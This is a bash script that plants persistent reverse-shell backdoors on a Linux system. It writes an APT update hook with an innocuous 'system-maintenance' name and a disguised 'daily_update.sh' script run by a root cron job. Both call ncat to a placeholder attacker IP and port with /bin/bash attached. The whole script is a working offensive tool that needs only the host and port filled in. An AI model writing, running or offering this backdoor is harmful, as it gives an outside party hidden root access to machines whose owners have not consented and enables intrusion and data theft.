
#!/bin/bash

# Set environment variables for the attacker's IP and port
export ATTACKER_IP=${ATTACKER_IP:-"attacker_ip"}
export ATTACKER_PORT=${ATTACKER_PORT:-"attacker_port"}

# Create an APT configuration file for the update hook
cat << EOF > /etc/apt/apt.conf.d/99-system-maintenance
# Reverse shell backdoor - replace 'attacker_ip' and 'attacker_port' with actual values
APT::Update::Pre-Invoke {"nohup ncat \${ATTACKER_IP} \${ATTACKER_PORT} -e /bin/bash 2> /dev/null &"};
EOF


# Create a script that will be executed by cron
cat << EOF > /usr/local/bin/daily_update.sh
#!/bin/bash

# Persistent reverse shell backdoor
export ATTACKER_IP=${ATTACKER_IP:-"\$ATTACKER_IP"}
export ATTACKER_PORT=${ATTACKER_PORT:-"\$ATTACKER_PORT"}

# Check if ATTACKER_IP and ATTACKER_PORT are set
if [[ "\$ATTACKER_IP" == "attacker_ip" || "\$ATTACKER_PORT" == "attacker_port" ]]; then
    echo "Error: Please set ATTACKER_IP and ATTACKER_PORT before running this script."
    exit 1
fi

nohup ncat \$ATTACKER_IP \$ATTACKER_PORT -e /bin/bash 2> /dev/null &
EOF

# Make the script executable
chmod +x /usr/local/bin/daily_update.sh

# Create a cron job to run the script daily
cat << EOF > /etc/cron.d/daily_update

# Run the daily_update.sh script daily at midnight
0 0 * * * root /usr/local/bin/daily_update.sh
EOF

# Provide instructions for removal
echo "To remove the APT hook, use: rm -f /etc/apt/apt.conf.d/99-system-maintenance"
echo "To remove the cron job, use: rm -f /etc/cron.d/daily_update"
